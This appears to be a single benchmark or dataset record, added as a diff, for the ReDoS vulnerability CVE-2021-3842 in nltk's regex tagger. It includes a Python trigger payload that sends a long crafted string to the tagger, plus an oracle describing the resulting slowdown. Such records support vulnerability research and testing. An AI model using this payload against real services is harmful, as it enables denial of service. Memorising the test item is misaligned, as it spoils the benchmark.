@@ -1,0 +1,15 @@
+{
+  "file_id": "101_nltk_issue_2906",
+  "numeric_id": "101",
+  "library_hint": "nltk",
+  "source": "github_issue",
+  "title": "Incorrectly specified regex in RegexpTagger leads to ReDoS vulnerability",
+  "cve": "CVE-2021-3842",
+  "cwe": "CWE-400: Uncontrolled Resource Consumption",
+  "library": "nltk",
+  "affected_version": "Prior to 3.7.1",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "from nltk.parse.malt import malt_regex_tagger\n\ttagger = malt_regex_tagger()\n\tlength = 50000\n\tt = time.time()\n\ttagger([\"-\" + \"0\" * length + \"q\"])\n\tprint(f\"Tagging took {time.time() - t:.8}s for length 50000.\")",
+  "oracle": "The tagging operation takes significantly longer (e.g., 26 seconds) compared to the fixed version (e.g., 0.002 seconds), indicating a ReDoS condition."
+}
